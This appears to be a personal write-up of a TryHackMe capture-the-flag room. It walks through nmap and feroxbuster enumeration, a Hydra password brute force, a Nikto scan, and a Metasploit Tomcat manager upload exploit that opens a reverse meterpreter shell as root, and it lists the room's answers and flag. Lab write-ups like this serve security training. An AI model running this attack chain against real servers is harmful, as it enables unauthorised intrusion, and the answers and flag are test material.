---
Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit 
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/77fd9d1804d33b5cf3adf1a2f3dcc34b.jpeg)

![](https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Toys_%22R%22_Us_logo.svg/1280px-Toys_%22R%22_Us_logo.svg.png)
Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.

This task requires you to use the following tools:

    Dirbuster
    Hydra
    Nmap
    Nikto
    Metasploit

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.130.146 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 16:34 EDT
Nmap scan report for 10.10.130.146
Host is up (0.23s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1b:77:3d:d3:1f:ad:70:3c:7c:91:ea:b4:d0:27:4b:86 (RSA)
|   256 2e:9e:54:a7:05:d4:f9:92:06:ef:a2:7a:dd:00:0e:1d (ECDSA)
|_  256 c0:69:4d:db:fd:6d:f0:6a:2d:11:5c:b2:0f:10:78:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/26%OT=22%CT=1%CU=40702%PV=Y%DS=2%DC=T%G=Y%TM=63320D1
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   245.14 ms 10.11.0.1
2   239.08 ms 10.10.130.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.39 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.130.146

┌──(kali㉿kali)-[~/Downloads]
└─$ feroxbuster --url http://10.10.130.146 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.130.146
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        4l       19w      168c http://10.10.130.146/
301      GET        9l       28w      319c http://10.10.130.146/guidelines => http://10.10.130.146/guidelines/

http://10.10.130.146/guidelines/

Hey bob, did you update that TomCat server? 


┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.130.146 http-get /protected/
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-26 16:49:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.130.146:80/protected/
[80][http-get] host: 10.10.130.146   login: bob   password: bubbles
[STATUS] attack finished for 10.10.130.146 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-26 16:49:38


http://10.10.130.146/protected/

bob:bubbles

This protected page has now moved to a different port.


┌──(kali㉿kali)-[~/Downloads]
└─$ nikto -h http://10.10.130.146:1234/manager/html -id "bob:bubbles"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.130.146
+ Target Hostname:    10.10.130.146
+ Target Port:        1234
+ Start Time:         2022-09-26 17:02:24 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ All CGI directories 'found', use '-C none' to test none



```

What directory can you find, that begins with a "g"?
Use dirbuster
*guidelines*


Whose name can you find from this directory?
*bob*
What directory has basic authentication?
*protected*
What is bob's password to the protected part of the website?
Use Hydra
*bubbles*

What other port that serves a webs service is open on the machine?
Use nmap
*1234*

Going to the service running on that port, what is the name and version of the software?
Answer format: Full_name_of_service/Version
*Apache Tomcat/7.0.88*

![[Pasted image 20220926155202.png]]

![](https://miro.medium.com/max/720/1*zIOlQRhDAoMv_rYAAYW6LA.png)

Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.
How many documentation files did Nikto identify?
*5*


What is the server version (run the scan against port 80)?
Look in your Nikto output
*Apache/2.4.18*


What version of Apache-Coyote is this service using?
*1.1*
Use Metasploit to exploit the service and get a shell on the system.
What user did you get a shell as?

```

┌──(kali㉿kali)-[~/Downloads]
└─$ msfconsole     
                                                  
     ,           ,
    /             \                                                                                      
   ((__---,,,---__))                                                                                     
      (_) O O (_)_________                                                                               
         \ _ /            |\                                                                             
          o_o \   M S F   | \                                                                            
               \   _____  |  *                                                                           
                |||   WW|||                                                                              
                |||     |||                                                                              
                                                                                                         

       =[ metasploit v6.2.18-dev                          ]
+ -- --=[ 2244 exploits - 1185 auxiliary - 398 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the edit command to open the 
currently active module in your editor

msf6 > search tomcat

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank       Check  Description
   -   ----                                                            ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos                2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/struts_dev_mode                              2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_namespace_ognl                       2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   4   auxiliary/admin/http/tomcat_ghostcat                            2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   5   exploit/windows/http/tomcat_cgi_cmdlineargs                     2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   6   exploit/multi/http/tomcat_mgr_deploy                            2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   7   exploit/multi/http/tomcat_mgr_upload                            2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   8   auxiliary/dos/http/apache_tomcat_transfer_encoding              2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   9   auxiliary/scanner/http/tomcat_enum                                               normal     No     Apache Tomcat User Enumeration
   10  exploit/multi/http/atlassian_confluence_webwork_ognl_injection  2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
   11  exploit/windows/http/cayin_xpost_sql_rce                        2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   12  exploit/multi/http/cisco_dcnm_upload_2019                       2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   13  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec    2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
   14  exploit/linux/http/cisco_hyperflex_file_upload_rce              2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
   15  exploit/linux/http/cpi_tararchive_upload                        2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   16  exploit/linux/http/cisco_prime_inf_rce                          2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   17  post/multi/gather/tomcat_gather                                                  normal     No     Gather Tomcat Credentials
   18  auxiliary/dos/http/hashcollision_dos                            2011-12-28       normal     No     Hashtable Collisions
   19  auxiliary/admin/http/ibm_drm_download                           2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   20  exploit/linux/http/lucee_admin_imgprocess_file_write            2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
   21  exploit/linux/http/mobileiron_core_log4shell                    2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
   22  exploit/multi/http/zenworks_configuration_management_upload     2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   23  exploit/multi/http/spring_framework_rce_spring4shell            2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
   24  auxiliary/admin/http/tomcat_administration                                       normal     No     Tomcat Administration Tool Default Access
   25  auxiliary/scanner/http/tomcat_mgr_login                                          normal     No     Tomcat Application Manager Login Utility
   26  exploit/multi/http/tomcat_jsp_upload_bypass                     2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   27  auxiliary/admin/http/tomcat_utf8_traversal                      2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   28  auxiliary/admin/http/trendmicro_dlp_traversal                   2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   29  post/windows/gather/enum_tomcat                                                  normal     No     Windows Gather Apache Tomcat Enumeration


Interact with a module by name or index. For example info 29, use 29 or use post/windows/gather/enum_tomcat                                                                                                       

msf6 > use 7
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...
                                            ]
   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploi
                                            t-framework/wiki/Using-Metasploit
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy
                                             will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.253.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.130.146
RHOSTS => 10.10.130.146
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 192.168.253.128:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying CEyas2agVy4WKnjOXUolFEWx3...
[*] Executing CEyas2agVy4WKnjOXUolFEWx3...
[*] Undeploying CEyas2agVy4WKnjOXUolFEWx3 ...
[*] Undeployed at /manager/html/undeploy
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/tomcat_mgr_upload) > sessions

Active sessions
===============

No active sessions.

msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 192.168.253.128:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying a82nCBLPQMUOZb2y4Scd3Lj3NjC...
[*] Executing a82nCBLPQMUOZb2y4Scd3Lj3NjC...
[*] Undeploying a82nCBLPQMUOZb2y4Scd3Lj3NjC ...
[*] Undeployed at /manager/html/undeploy
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost 10.11.81.220
lhost => 10.11.81.220
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.11.81.220:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying FZ9aBNK...
[*] Executing FZ9aBNK...
[*] Sending stage (58829 bytes) to 10.10.130.146
[*] Undeploying FZ9aBNK ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.11.81.220:4444 -> 10.10.130.146:52464) at 2022-09-26 17:14:09 -0400

meterpreter > getuid
Server username: root
meterpreter > cat /root/flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1


```


*root*

What text is in the file /root/flag.txt
*ff1fc4a81affcc7688cf89ae7dc6e0e1*

[[Credentials Harvesting]]